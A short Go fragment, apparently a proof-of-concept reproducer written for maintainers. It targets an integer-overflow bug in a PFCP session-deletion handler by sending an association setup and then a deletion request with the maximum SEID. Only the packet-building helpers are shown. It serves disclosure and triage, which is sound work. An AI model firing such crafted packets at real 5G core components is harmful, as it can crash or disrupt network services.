// Rationale for maintainers:
// - Sends AssociationSetupRequest (seq=1) to establish association
// - Immediately sends SessionDeletionRequest with SEID=0xFFFFFFFFFFFFFFFF
// - This targets the DeleteSess() integer overflow bug (and may also hit Sess()).
// - Compact, single-path flow to ease reproduction and triage.

// forcePFCPv1 sets PFCP version to 1 while keeping low 5 bits of first byte.
func forcePFCPv1(pkt []byte) {
	if len(pkt) > 0 {
		pkt[0] = (1 << 5) | (pkt[0] & 0x1F)
	}
}

func assocSetup(seq uint32, nodeIP net.IP) []byte {
	p, err := message.NewAssociationSetupRequest(
		seq,
		ie.NewNodeID(nodeIP.String(), "", ""),
		ie.NewRecoveryTimeStamp(time.Now()),
	).Marshal()
	if err != nil {
		log.Fatalf("assoc marshal: %v", err)
	}
	forcePFCPv1(p)
	return p
}

